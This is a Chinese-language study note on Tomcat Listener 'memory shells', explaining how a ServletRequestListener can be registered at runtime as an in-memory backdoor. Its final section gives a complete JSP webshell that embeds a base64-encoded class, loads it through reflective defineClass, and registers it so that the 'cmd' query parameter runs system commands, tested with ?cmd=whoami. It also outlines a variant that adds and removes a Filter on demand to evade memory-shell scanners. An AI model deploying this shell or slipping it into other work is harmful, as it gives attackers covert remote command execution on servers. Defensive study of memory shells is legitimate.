# Tomcat Listener 内存马

> [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#listener-内存马)

---

- [Tomcat Listener 内存马](#tomcat-listener-内存马)
  - [Listener内存马基本知识](#listener内存马基本知识)

---

## Listener内存马基本知识

Servlet 和 Filter 相对于 Listener 更常用, 因此更容易找到内存马注入的相关材料, 而 Listener 相对而言就冷门了一些

Listener(监听器)用于监听对象/流程的创建与销毁，通过 Listener 可以自动触发一些操作，因此依靠它也可以完成内存马的实现。

先来了解一下 Listener 是干什么的，看一下 Servlet API 中的注释。

![image-20240930170541398](http://cdn.ayusummer233.top/DailyNotes/202409301705658.png)

在应用中可能调用的监听器如下：

- ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
- ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
- ServletRequestListener：对 Request 请求进行监听（创建、销毁）
- ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
- javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
- javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听

可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 `java.util.EventListener` 的子接口。

这里我们看到，在` ServletRequestListener` 接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马。

![image-20241007191534811](http://cdn.ayusummer233.top/DailyNotes/202410071915963.png)

> 除了这个 Listener，其他的 Listener 在某些情况下也可以触发作为内存马的实现，[原文](https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC)里没有对每个都进行触发测试，感兴趣的师傅可以自测。
>
> ---
>
> PS: 这里沿着原文作者的思路梳理 Listener 内存马原理, 也暂且不会对其他 Listener 做单独测试

ServletRequestListener 提供两个方法：`requestInitialized` 和 `requestDestroyed`，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。

![image-20241008182622322](http://cdn.ayusummer233.top/DailyNotes/202410081826508.png)

![image-20241008182652523](http://cdn.ayusummer233.top/DailyNotes/202410081826652.png)

Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。

![image-20241009141200546](http://cdn.ayusummer233.top/DailyNotes/202410091412648.png)

---

## Listener内存马示例

### 示例效果

我们还是实现一个简单的功能，在 requestDestroyed 方法中获取 response 对象，向页面原本输出多写出一个字符串。

正常访问时：

![image-20241009173049025](http://cdn.ayusummer233.top/DailyNotes/202410091730152.png)

添加 Listener，可以看到，由于我们是在 requestDestroyed 中植入恶意逻辑，那么在本次请求中就已经生效了：

![image-20241009173123380](http://cdn.ayusummer233.top/DailyNotes/202410091731434.png)

访问之前的路径也生效了：

![image-20241009173144092](http://cdn.ayusummer233.top/DailyNotes/202410091731153.png)

---

### 整体思路

编写恶意 Listener 编译得到 class 文件, 将 class 文件编码为 Base64 字符串, 编写相应的解码程序, 并利用强制类型转换转换为 Java 对象, 获取到 StandardContext 之后利用 addApplicationEventListener 方法注册恶意 Listener

---

### 示例构造

#### 环境准备

开发和测试环境还是沿用前面 Tomcat Filter/Servlet 内存马的环境

- 开发环境: jdk21 + Maven 3.9.9

  项目结构如下, 有链接的为新增文件

  - `src/main`
    - `java/com/summer233`
      - DemoServlet.java
      - IndexServlet.java
      - [SummerBasicListener.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/SummerBasicListener.java)
      - [DynamicUtils.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/DynamicUtils.java)
      - [AddTomcatListener.java](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/AddTomcatListener.java)
      - [SummerCMDListener](https://github.com/233Official/DailyNotesCode/blob/main/Security/Web/MemShell/Java/Tomcat/ServletAPI/TomcatServletAPIMemshell/src/main/java/com/summer233/SummerCMDListener.java)
    - `webapp/WEB-INF`
      - web.xml
  - pom.xml

- 测试环境: tomcat:8 docker (Tomcat 8.5.100)

---

#### 制作Listener

实现一个 `ServletRequestListener` 重写其中的 `requestDestroyed` 方法

通过 ServletRequestEvent 对象获取当前的 ServletRequest，并将其强制转换为 RequestFacade 类型。

接着，使用反射机制获取 RequestFacade 类中的私有字段 request。通过调用 Field 对象的 setAccessible(true) 方法，使得这个私有字段可以被访问。然后，通过 Field 对象的 get 方法获取实际的 Request 对象

获取到 Request 对象后，调用其 `getResponse().getWriter().println()` 方法，在响应中写入一行文本

```java
package com.summer233;

import java.lang.reflect.Field;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;

public class BasicListener implements ServletRequestListener {
   public BasicListener() {
   }

   public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
      try {
         RequestFacade request = (RequestFacade) servletRequestEvent.getServletRequest();
         Field f = request.getClass().getDeclaredField("request");
         f.setAccessible(true);
         Request req = (Request) f.get(request);
         req.getResponse().getWriter().println("\nBasicListener requestDestroyed Injected");
      } catch (Exception var5) {
         var5.printStackTrace();
      }

   }

   public void requestInitialized(ServletRequestEvent servletRequestEvent) {
   }
}

```

---

#### 编译 Listener 然后将 class 文件转换为 Base64 字符串

直接 `mvn clean package` 编译项目然后在 `target/classes` 中找到该  Listener 的 class 文件

![image-20241009154044903](http://cdn.ayusummer233.top/DailyNotes/202410091540059.png)

将其转换为 Base64 字符串

![image-20241009154347040](http://cdn.ayusummer233.top/DailyNotes/202410091543132.png)

---

#### 编写Listener注册代码

![image-20241009155502792](http://cdn.ayusummer233.top/DailyNotes/202410091555851.png)

![image-20241009160811300](http://cdn.ayusummer233.top/DailyNotes/202410091608367.png)

---

#### 编译并部署war包

`mvn clean package` 编译后取 `target` 中的 war 包放置到 `tomcat:8` 的 webapps 目录下自动部署

![image-20241009160933681](http://cdn.ayusummer233.top/DailyNotes/202410091609777.png)

![image-20241009161108540](http://cdn.ayusummer233.top/DailyNotes/202410091611618.png)

访问这个 webapp 的默认页面: `/tomcat-servletapi-memshell-listener-0.1`:

![image-20241009161245707](http://cdn.ayusummer233.top/DailyNotes/202410091612756.png)

访问 `/dynamicAddListener` 注册 Listener:

![image-20241009161434970](http://cdn.ayusummer233.top/DailyNotes/202410091614023.png)

刷新一下默认页面:

![image-20241009161456731](http://cdn.ayusummer233.top/DailyNotes/202410091614776.png)

---

#### 编写并注册恶意Listener

像前面 Filter,Servlet 内存马中那样编写一个将 Query 参数 `cmd` 的值作为系统命令执行并打印输出的恶意 Listener:

![image-20241009163029448](http://cdn.ayusummer233.top/DailyNotes/202410091630516.png)

---

编译得到对应 class 文件, 然后转换成 Base64 字符串:

![image-20241009163618307](http://cdn.ayusummer233.top/DailyNotes/202410091636399.png)

---

编写注册代码:

![image-20241009163945700](http://cdn.ayusummer233.top/DailyNotes/202410091639794.png)

![image-20241009163958115](http://cdn.ayusummer233.top/DailyNotes/202410091639185.png)

---

编译生成 war 包:

![image-20241009164500263](http://cdn.ayusummer233.top/DailyNotes/202410091645349.png)

---

部署到 `tomcat:8` 的 webapps 目录下

![image-20241009164601683](http://cdn.ayusummer233.top/DailyNotes/202410091646773.png)

---

测试效果:

`/tomcat-servletapi-memshell-listener-0.2`:

![image-20241009173049025](http://cdn.ayusummer233.top/DailyNotes/202410091730152.png)

`/tomcat-servletapi-memshell-listener-0.2/dynamicAddListener`:

![image-20241009173123380](http://cdn.ayusummer233.top/DailyNotes/202410091731434.png)

`/tomcat-servletapi-memshell-listener-0.2/?cmd=id`:

![image-20241009173144092](http://cdn.ayusummer233.top/DailyNotes/202410091731153.png)

---

## 其他用法思路

[JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#listener-内存马) 作者后记:

除了 EventListener，Tomcat 还存在了一个 LifecycleListener ，当然也肯定有可以用来触发的实现类，但是用起来一定是不如 ServletRequestListener ，但是也可以关注一下。这里将不会进行演示。

由于在 ServletRequestListener 中可以获取到 ServletRequestEvent，这其中又存了很多东西，ServletContext/StandardContext 都可以获取到，那玩法就变得更多了。可以根据不同思路实现很多非常神奇的功能，我举个例子：

- 在 requestInitialized 中监听，如果访问到了某个特定的 URL，或这次请求中包含某些特征（可以拿到 request 对象，随便怎么定义），则新起一个线程去 StandardContext 中注册一个 Filter，可以实现某些恶意功能。
- 在 requestDestroyed 中再起一个新线程 sleep 一定时间后将我们添加的 Filter 卸载掉。

这样我们就有了一个真正的动态后门，只有用的时候才回去注册它，用完就删。平常使用扫内存马的软件也根本扫不出来。这个例子也是我突然拍脑袋想出来的，可能实际意义并不大，但是可以看出 Listener 内存马的危害性和玩法的变化要大于 Filter/Servlet 内存马的。

---

## JSP马

类似前面构造 Servlet JSP 马一样来写, 需要额外导入一个 `javax.servlet.ServletRequestListener` 来做类型转换:

```jsp
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %> 
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="javax.servlet.ServletRequestListener" %>

<%!
    String SUMMER_CMD_LISTENER_CLASS_STRING_BASE64 = "yv66vgAAAEEAzwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsHAA4BACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlCgACABAMABEAEgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwgAFAEAB3JlcXVlc3QKABYAFwcAGAwAGQAaAQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAHAAdBwAeDAAfACABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgAcACIMACMAJAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwAmAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAoAJQAoDAApACoBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwgALAEAGHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOAsALgAvBwAwDAAxADIBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAA0AQAFVVRGLTgLAC4ANgwANwAyAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcLAC4AOQwAOgA7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAD0BAB90aGlzIGlzIGEgU3VtbWVyQ01ETGlzdGVuZXI8YnI+CgA/AEAHAEEMAEIAMgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuCABEAQADY21kCwBGAEcHAEgMAEkASgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwcATAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcATgEAEGphdmEvbGFuZy9TdHJpbmcIAFABAAZ3aG9hbWkKAEsAUgwABQBTAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgoASwBVDABWAFcBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoAWQBaBwBbDABcAF0BABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAF8BABFqYXZhL3V0aWwvU2Nhbm5lcgoAXgBhDAAFAGIBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAGQBAAJcYQoAXgBmDABnAGgBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAF4AagwAawBsAQAHaGFzTmV4dAEAAygpWgoAXgBuDABvAHABAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsIAHIBAAAIAHQBAAFcCgBNAHYMAHcAeAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCgBeAHoMAHsABgEABWNsb3NlBwB9AQATamF2YS9sYW5nL1Rocm93YWJsZQoAfAB/DACAAIEBAA1hZGRTdXBwcmVzc2VkAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWCACDAQACc2gIAIUBAAItYwgAhwEAB2NtZC5leGUIAIkBAAIvYwoAiwCMBwCNDACOAI8BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAIsAkQwAkgCTAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKAD8AlQwAlgAGAQAFZmx1c2gKAD8AegcAmQEAE2phdmEvbGFuZy9FeGNlcHRpb24KAJgAmwwAnAAGAQAPcHJpbnRTdGFja1RyYWNlBwCeAQAfY29tL3N1bW1lcjIzMy9TdW1tZXJDTURMaXN0ZW5lcgcAoAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9zdW1tZXIyMzMvU3VtbWVyQ01ETGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQAIb3V0cHV0T1MBABJMamF2YS9sYW5nL1N0cmluZzsBAAlzY2FubmVyT1MBABNMamF2YS91dGlsL1NjYW5uZXI7AQAOcmVzcG9uc2VXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAZvdXRwdXQBAAFzAQAHaXNMaW51eAEAAVoBABBwcm9jZXNzQnVpbGRlck9TAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAlwcm9jZXNzT1MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAEaW5PUwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAdodHRwUmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEdmFyNQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEADVN0YWNrTWFwVGFibGUHAMoBABNqYXZhL2lvL0lucHV0U3RyZWFtBwC5AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAFlN1bW1lckNNRExpc3RlbmVyLmphdmEAIQCdAAIAAQCfAAAAAwABAAUABgABAKEAAAAzAAEAAQAAAAUqtwABsQAAAAIAogAAAAoAAgAAABEABAASAKMAAAAMAAEAAAAFAKQApQAAAAEApgCnAAEAoQAABKkABgATAAABpSu2AAfAAA1NLLYADxITtgAVTi0EtgAbLSy2ACHAACU6BBkEtgAnOgUZBRIruQAtAgAZBRIzuQA1AgAZBbkAOAEAEjy2AD4ZBDoGGQYSQ7kARQIAOgcZB8YBRQQ2CLsAS1kEvQBNWQMST1O3AFE6CRkJtgBUOgoZCrYAWDoLuwBeWRkLtwBgEmO2AGU6DBkMtgBpmQALGQy2AG2nAAUScToNGQ0Sc7YAdZkABgM2CBkMxgAmGQy2AHmnAB46DRkMxgAUGQy2AHmnAAw6DhkNGQ62AH4ZDb8VCJkAGQa9AE1ZAxKCU1kEEoRTWQUZB1OnABYGvQBNWQMShlNZBBKIU1kFGQdTOgy4AIoZDLYAkLYAWDoNuwBeWRkNtwBgEmO2AGU6DhkOtgBpmQALGQ62AG2nAAUScToPGQW5ADgBADoQGRAZD7YAPhkQtgCUGRDGACYZELYAl6cAHjoRGRDGABQZELYAl6cADDoSGREZErYAfhkRvxkOxgAmGQ62AHmnAB46DxkOxgAUGQ62AHmnAAw6EBkPGRC2AH4ZD7+nAAhNLLYAmrEABwCNAK4AuwB8AMIAxwDKAHwBQAFMAVkAfAFgAWUBaAB8ASMBdAGBAHwBiAGNAZAAfAAAAZwBnwCYAAMAogAAAJYAJQAAABYACAAXABIAGAAXABkAIQAaACgAGwAxABwAOgAdAEYAHwBKACAAVQAhAFoAIgBdACMAbwAkAHYAJQB9ACYAjQAnAKEAKQCrACoArgAsALsAJgDWAC0A8QAuAQYALwETADABIwAxATcAMgFAADMBRwA0AUwANQFZADIBdAA2AYEAMAGcADoBnwA4AaAAOQGkADwAowAAAMoAFAChAA0AqACpAA0AjQBJAKoAqwAMAUAANACsAK0AEAE3AD0ArgCpAA8BIwB5AK8AqwAOAF0BPwCwALEACABvAS0AsgCzAAkAdgEmALQAtQAKAH0BHwC2ALcACwEGAJYAuAC5AAwBEwCJALoAtwANAAgBlAAUALsAAgASAYoAvAC9AAMAIQF7AL4AvwAEACgBdADAAMEABQBKAVIAwgDDAAYAVQFHAEQAqQAHAaAABADEAMUAAgAAAaUApAClAAAAAAGlAMYAxwABAMgAAAFOABX/AJ0ADQcAnQcACAcADQcAHAcAJQcALgcARgcATQEHAEsHAFkHAMkHAF4AAEEHAE0OTAcAfP8ADgAOBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAXgcAfAABBwB8CPkAAhpSBwDL/gAuBwDLBwDJBwBeQQcATf8AIwARBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcATQcAPwABBwB8/wAOABIHAJ0HAAgHAA0HABwHACUHAC4HAEYHAE0BBwBLBwBZBwDJBwDLBwDJBwBeBwBNBwA/BwB8AAEHAHwI+AACTAcAfP8ADgAQBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcAfAABBwB8CP8AAgACBwCdBwAIAABCBwCYBAABAMwApwABAKEAAAA1AAAAAgAAAAGxAAAAAgCiAAAABgABAAAAPwCjAAAAFgACAAAAAQCkAKUAAAAAAAEAxgDHAAEAAQDNAAAAAgDO";
    
    // 获取当前线程的上下文类加载器 ClassLoader
    ClassLoader loader = Thread.currentThread().getContextClassLoader();
    // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
    Base64.Decoder base64Decoder = Base64.getDecoder();
    byte[] decodeBytes = base64Decoder.decode(SUMMER_CMD_LISTENER_CLASS_STRING_BASE64);

    Method method = null;
    Class<?> clz = loader.getClass();
    Class<?> listenerClass = null;
%>

<%
    // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
    // Object 类为止
    while (method == null && clz != Object.class) {
        try {
            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        } catch (NoSuchMethodException ex) {
            clz = clz.getSuperclass();
        }
    }
    if (method != null) {
        // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
        method.setAccessible(true);
        // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
        listenerClass = (Class<?>) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
    }

    // 获取StandardContext
    StandardContext standardCtx = null;
    ServletContext servletContext = request.getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    Object appContext = appContextField.get(servletContext);

    Field standardCtxField = appContext.getClass().getDeclaredField("context");
    standardCtxField.setAccessible(true);
    standardCtx = (StandardContext) standardCtxField.get(appContext);

    if (standardCtx != null) {
        // 添加监听器
        standardCtx.addApplicationEventListener((ServletRequestListener) listenerClass.getDeclaredConstructor().newInstance());


        out.println("Successfully added a new listener By Base64 Class String to StandardContext");
    } else {
        out.println("Failed to get StandardContext");
    }
%>
```

上传到 tomcat webapps 目录下, 比如上传到 ROOT 目录里:

![image-20241010113512205](http://cdn.ayusummer233.top/DailyNotes/202410101135319.png)

直接测试命令执行: `/dynamicAddListenerBase64Class.jsp?cmd=whoami`

![image-20241010113622848](http://cdn.ayusummer233.top/DailyNotes/202410101136899.png)

![image-20241010113715324](http://cdn.ayusummer233.top/DailyNotes/202410101137391.png)

---





























